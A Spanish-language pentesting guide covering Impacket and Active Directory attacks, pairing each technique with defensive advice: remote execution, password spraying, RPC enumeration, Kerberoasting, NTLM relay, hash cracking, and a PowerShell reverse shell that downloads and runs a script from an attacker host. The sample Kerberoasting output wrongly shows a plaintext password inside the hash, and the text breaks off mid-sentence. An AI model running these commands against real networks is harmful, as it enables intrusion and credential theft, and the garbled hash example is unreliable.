# **🚀 Impacket & Active Directory: Herramientas y Técnicas para Auditorías de Seguridad**
*Una guía práctica para entender y defenderte de ataques comunes en entornos Windows*

---

## **📌 Introducción**
Impacket es una **suite de herramientas de código abierto** desarrollada en Python, diseñada para interactuar con protocolos de red de Windows (como SMB, Kerberos, LDAP, etc.). Es ampliamente utilizada en **auditorías de seguridad, pruebas de penetración y análisis forense**, pero también puede ser explotada por atacantes para **movimiento lateral, escalada de privilegios y exfiltración de datos**.

En este **README.md**, exploraremos:
✅ **Herramientas clave** como `psexec.py`, `cme`, `GetUserSPNs.py`, `Responder` y `ntlmrelayx.py`.
✅ **Técnicas de ataque** comunes en entornos Active Directory (AD).
✅ **Cómo proteger tu infraestructura** contra estos vectores de amenaza.
✅ **Comandos esenciales** con ejemplos prácticos.

---

## **🔧 Desglose de Herramientas y Comandos**

---

### **1️⃣ Ejecución Remota y Movimiento Lateral**
#### **📌 `psexec.py` – Ejecución de comandos remotos**
**Descripción:**
Permite obtener una **consola interactiva (cmd.exe/powershell.exe)** en un sistema Windows remoto, similar a **PsExec de Sysinternals**, pero con capacidades avanzadas para pruebas de penetración.

**🔹 Sintaxis básica:**
```bash
psexec.py [dominio]/[usuario]:[contraseña]@[IP_objetivo] [comando]
```

**🔹 Ejemplo real:**
```bash
psexec.py s4vicorp.local/Administrador:P@\$w0rd\!@192.168.94.138 cmd.exe
```
- **`s4vicorp.local/Administrador`**: Dominio y usuario (Administrador).
- **`P@\$w0rd\!`**: Contraseña (los símbolos como `!` o `@` requieren escape con `\`).
- **`192.168.94.138`**: IP del objetivo.
- **`cmd.exe`**: Comando a ejecutar (en este caso, abre una consola remota).

**🔹 Usos comunes:**
- **Administración remota** (gestión de servidores sin acceso físico).
- **Movimiento lateral** en ataques (ej: pivoting desde una máquina comprometida).
- **Ejecución de scripts o herramientas** en múltiples hosts.

**⚠️ Nota de seguridad:**
✔ **Requiere credenciales de administrador** (o al menos permisos elevados).
✔ **Interactúa con recursos compartidos administrativos** como `ADMIN$` y `IPC$`.
✔ **Puede ser detectado** por soluciones EDR/XDR si se usa de forma anómala.

**🔹 ¿Cómo protegerte?**
- **Restringe el acceso a cuentas administrativas** (Principio de Mínimo Privilegio).
- **Monitorea el uso de PsExec** en logs de Windows (Event ID 4688 para procesos ejecutados).
- **Desactiva el acceso anónimo** a recursos compartidos (`RestrictAnonymous = 1` en políticas de grupo).

---

### **2️⃣ Reconocimiento y Enumeración de Red**
#### **📌 `CrackMapExec (cme)` – Auditoría masiva de redes AD**
**Descripción:**
Herramienta **multipropósito** para auditar redes Windows, especialmente en entornos Active Directory. Permite:
- **Password Spraying** (validar credenciales en múltiples hosts).
- **Enumeración de usuarios y grupos**.
- **Detección de cuentas con privilegios elevados**.

**🔹 Sintaxis básica:**
```bash
cme [protocolo] [objetivo] -u [usuario] -p [contraseña]
```

**🔹 Ejemplo real:**
```bash
cme smb 192.168.94.0/24 -u 'SVC_SQLservice' -p 'MYpassword123#'
```
- **`smb`**: Protocolo utilizado (SMB es el más común en Windows).
- **`192.168.94.0/24`**: Rango de red a escanear (desde `.1` hasta `.254`).
- **`-u 'SVC_SQLservice'`**: Usuario a probar.
- **`-p 'MYpassword123#'`**: Contraseña a validar.

**🔹 Salida típica:**
```
[*] SVC_SQLservice:MYpassword123# => 192.168.94.50 (Pwn3d!)
[*] SVC_SQLservice:MYpassword123# => 192.168.94.100 (Pwn3d!)
```
- **`Pwn3d!`** indica que el usuario tiene **privilegios de administrador local** en ese host.

**🔹 Usos comunes:**
- **Identificar hosts vulnerables** en una red corporativa.
- **Validar políticas de contraseñas débiles**.
- **Encontrar cuentas con privilegios elevados** para escalada de ataques.

**🔹 ¿Cómo protegerte?**
- **Implementa políticas de contraseñas robustas** (longitud mínima, complejidad, expiración).
- **Bloquea cuentas después de N intentos fallidos** (Account Lockout Policy).
- **Usa herramientas como `LAPS`** para gestionar contraseñas locales de administradores.

---

#### **📌 `rpcclient` – Enumeración de usuarios en AD**
**Descripción:**
Herramienta de **Samba** que permite interactuar con servicios RPC de Windows para extraer información de usuarios y grupos.

**🔹 Sintaxis básica:**
```bash
rpcclient -U "dominio\usuario%password" [IP] -c 'comando'
```

**🔹 Ejemplo real (lista de usuarios):**
```bash
rpcclient -U "s4vicorp.local\mvazquez%Password1" 192.168.94.136 -c 'enumdomusers'
```
- **`s4vicorp.local\mvazquez%Password1`**: Credenciales de usuario.
- **`192.168.94.136`**: IP del controlador de dominio.
- **`-c 'enumdomusers'`**: Comando para listar usuarios.

**🔹 Salida típica:**
```
[Administrador] rid:[0x1f4]
[mvazquez] rid:[0x3e9]
[test] rid:[0xa28]
```

**🔹 Ejemplo avanzado (bucle para obtener detalles de usuarios):**
```bash
for rid in $(rpcclient -U "s4vicorp.local\mvazquez%Password1" 192.168.94.136 -c 'enumdomusers' | grep -oP 'rid:\K[^]]+' | tr '[:upper:]' '[:lower:]'); do
    rpcclient -U "s4vicorp.local\mvazquez%Password1" 192.168.94.136 -c "queryuser $rid"
done
```
- **Obtiene información detallada** como descripción, grupos y últimos logon.

**⚠️ Nota de seguridad:**
- **Las versiones modernas de Windows bloquean sesiones nulas** (ej: `rpcclient -U "" 192.168.94.136 -N` falla con `NT_STATUS_ACCESS_DENIED`).
- **Si el servidor permite sesiones nulas, es un riesgo crítico** (permite enumeración sin autenticación).

**🔹 ¿Cómo protegerte?**
- **Desactiva sesiones nulas** en políticas de grupo (`Network access: Restrict anonymous access to Named Pipes and Shares = 1`).
- **Monitorea intentos de enumeración** en logs de Windows (Event ID 4662 para accesos RPC).

---

### **3️⃣ Ataques de Identidad en Active Directory**
#### **📌 `GetUserSPNs.py` – Kerberoasting**
**Descripción:**
Técnica para **extraer hashes de contraseñas de cuentas de servicio** (SPN) en AD, que luego pueden ser crackeados offline.

**🔹 Sintaxis básica:**
```bash
GetUserSPNs.py [dominio]/[usuario]:[contraseña] -request
```

**🔹 Ejemplo real:**
```bash
GetUserSPNs.py s4vicorp.local/ramlux:Password1 -request
```
- **`s4vicorp.local/ramlux:Password1`**: Credenciales válidas (no necesariamente de administrador).
- **`-request`**: Solicita tickets de servicio (TGS) para cuentas con SPN configurado.

**🔹 Salida típica:**
```bash
$krb5tgs$23$*svc_sqlservice$...$MYpassword123#
```
- **`$krb5tgs$23$`**: Formato del hash Kerberos.
- **`MYpassword123#`**: Contraseña en texto plano si es débil.

**🔹 Usos comunes:**
- **Obtener credenciales de cuentas de servicio** (ej: `svc_sqlservice`, `svc_backup`).
- **Crackear hashes offline** con herramientas como **John the Ripper** o **Hashcat**.

**🔹 ¿Cómo protegerte?**
- **Usa contraseñas complejas y largas** para cuentas de servicio.
- **Evita configurar SPN en cuentas con contraseñas débiles**.
- **Implementa políticas de contraseñas robustas** y **rotación periódica**.
- **Habilita Kerberos Armoring (KDC PAC Validation)** para evitar ataques de robo de tickets.

---

#### **📌 `Responder.py` + `ntlmrelayx.py` – NTLM Relay Attack**
**Descripción:**
Técnica para **capturar autenticaciones NTLM** y **retransmitirlas** a otros servidores para ganar acceso.

**🔹 Herramientas involucradas:**
1. **`Responder.py`**: Envenena peticiones de red (LLMNR, NBT-NS, MDNS) para capturar hashes NTLM.
2. **`ntlmrelayx.py`**: Toma los hashes capturados y los usa para autenticarse en otros servidores.

**🔹 Ejemplo real:**
```bash
# 1. Iniciar Responder para capturar hashes
python3 Responder.py -I eth0 -rdw

# 2. Preparar ntlmrelayx con una lista de objetivos
ntlmrelayx.py -tf targets.txt -smb2support
```
- **`-I eth0`**: Interfaz de red a monitorizar.
- **`-rdw`**: Desactiva servidores internos de Responder.
- **`-tf targets.txt`**: Archivo con IPs de servidores objetivo.
- **`-smb2support`**: Habilita soporte para SMBv2.

**🔹 ¿Por qué es peligroso?**
- **No requiere crackear contraseñas** (usa la identidad de la víctima en tiempo real).
- **Funciona incluso si la contraseña es compleja** (solo necesita que el hash sea válido).
- **Puede escalar a control total** si la víctima tiene privilegios de administrador.

**🔹 ¿Cómo protegerte?**
- **Habilita SMB Signing** (`RequireSecuritySignature = 1` en políticas de grupo).
- **Bloquea LLMNR/NBT-NS** en la red (desactívalos mediante GPO).
- **Monitorea intentos de autenticación sospechosos** (Event ID 4624 y 4625 en logs de Windows).

---

### **4️⃣ Craqueo de Contraseñas**
#### **📌 `John the Ripper` – Descifrado de hashes**
**Descripción:**
Herramienta para **romper contraseñas cifradas** mediante ataques de diccionario o fuerza bruta.

**🔹 Sintaxis básica:**
```bash
john --wordlist=/ruta/diccionario hash.txt
```

**🔹 Ejemplo real (crackear hash de Kerberoasting):**
```bash
# 1. Guardar el hash en un archivo
echo '$krb5tgs$23$*svc_sqlservice$...$MYpassword123#' > hash.txt

# 2. Ejecutar John con rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- **`rockyou.txt`**: Diccionario popular con millones de contraseñas filtradas.
- **Salida exitosa:**
  ```
  MYpassword123#  (svc_sqlservice)
  ```

**🔹 Usos comunes:**
- **Validar la robustez de contraseñas** en auditorías.
- **Recuperar credenciales en entornos comprometidos**.

**🔹 ¿Cómo protegerte?**
- **Usa contraseñas largas y complejas** (ej: `Tr0ub4d0ur&3` en lugar de `Password1`).
- **Implementa políticas de contraseñas** con longitud mínima y complejidad.
- **Habilita autenticación multifactor (MFA)** para cuentas críticas.

---

### **5️⃣ Preparación de Shells e Infraestructura**
#### **📌 `Nishang` (PowerShell) + `Netcat` – Reverse Shell**
**Descripción:**
Técnica para **obtener control remoto** de una máquina víctima mediante un script de PowerShell y Netcat.

**🔹 Pasos para configurar la infraestructura:**
```bash
# 1. Copiar y editar el script de Nishang
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
nano PS.ps1  # Añadir línea: Invoke-PowerShellTcp -Reverse -IPAddress [ATACANTE_IP] -Port 4646

# 2. Iniciar servidor web para servir el script
python -m SimpleHTTPServer 8000

# 3. Abrir listener con Netcat
nc -nlvp 4646
```

**🔹 Comando en la víctima (ejecutado vía cmd.exe o PowerShell):**
```powershell
powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://[ATACANTE_IP]:8000/PS.ps1')"
```
- **`IEX`**: Ejecuta el script descargado.
- **`DownloadString`**: Descarga el script desde el servidor del atacante.

**🔹 ¿Cómo protegerte?**
- **Restringe la ejecución de scripts de PowerShell** (`ExecutionPolicy = Restricted`).
- **Monitorea descargas de archivos sospechosos** (Event ID 4688 para procesos `powershell.exe`).
- **Usa herramientas como `Sysmon`** para detectar conexiones entrantes no autorizadas.

---

## **🛡️ Recomendaciones de Seguridad para Proteger tu Entorno AD**

| **Riesgo**               | **Solución Recomendada**                                                                 |
|--------------------------|----------------------------------------------------------------------------------------|
| **Contraseñas débiles**  | Implementa políticas de contraseñas robustas (longitud mínima 12, complejidad, expiración). |
| **Movimiento lateral**   | Segmenta la red (VLANs), aplica Principio de Mínimo Privilegio, usa `LAPS` para contraseñas locales. |
| **Kerberoasting**        | Configura SPN solo en cuentas con contraseñas seguras, usa contraseñas largas (>15 caracteres). |
| **NTLM Relay**           | Habilita **SMB Signing**, desactiva LLMNR/NBT-NS, usa **Protected Users Group** en AD. |
| **Enumeración de usuarios** | Desactiva **sesiones nulas**, aplica GPO para restringir acceso RPC (`RestrictAnonymous = 1`). |
| **Reverse Shells**       | Monitoriza ejecuciones de PowerShell, usa **AppLocker** para bloquear scripts no autorizados. |

---

## **📚 Recursos Adicionales**
- **Documentación oficial de Impacket**: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
- **Guía de Hacking Ético en AD**: [https://book.spartan-cybersec.com](https://book.spartan-cybersec.com)
- **Curso de Pentesting con Impacket**: [https://www.udemy.com/course/active-directory-pentesting/](https://www.udemy.com/course/active-directory-pentesting/)
- **Herramientas complementarias**:
  - **BloodHound** (mapeo de ataques en AD).
  - **Mimikatz** (extracción de credenciales en memoria).
  - **Rubeus** (ataques a Kerberos).

---

## **🎯 Conclusión**
Impacket y las técnicas asociadas son **herramientas poderosas** tanto para **auditores de seguridad** como para **atacantes**. Entender su funcionamiento es **clave para defenderse** y **fortalecer tu infraestructura**.

🔹 **Si eres administrador de sistemas**:
> *"La seguridad no es un producto, sino un proceso"* → **Aplica capas de defensa (defense in depth
